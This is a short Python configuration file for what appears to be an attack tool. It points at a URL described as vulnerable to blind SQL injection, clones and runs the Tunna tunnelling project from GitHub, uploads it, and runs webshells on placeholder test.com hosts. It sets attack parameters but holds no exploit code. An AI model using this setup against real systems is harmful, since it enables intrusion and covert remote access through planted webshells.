# Run webshells at "http://frontend.test.com/Tunna/webshells/conn.php"
config = {
    'url': 'http://frontend.test.com',
    'url2': 'http://admin.test.com',
    'vulnerable_url': 'http://admin.test.com/addnews.php?user_id=15',  # vuln url contain blind sqli
    'script_name': 'shelln3#%n446nmn!#&*^',
    'interupt': 'n3#%n446nmn!#&*^',
    'git_clone_tunna': 'git clone https://github.com/sadekyo1712/Tunna',
    'run_tunna_server': 'python Tunna/webserver.py',
    'upload_tunna': True,
    'use_tunna_server': True,
    'url_exploit': 'http://admin.test.com/addnews.php?user_id=15',
    'signal_str': 'Khanh Nguyen',  # signal to assert right respone from webserver
    'data': '',
    'vulnerable_param': '',
    'cookie': '',
    'timeout': 0,
    'method': 'GET',
    'dbms': 'mysql',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
    'Accept-Language': 'en-us',
    'Accept-Encoding': 'text/html;q=0.9',
    'Keep-Alive': '300',
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'verbose': True,
}
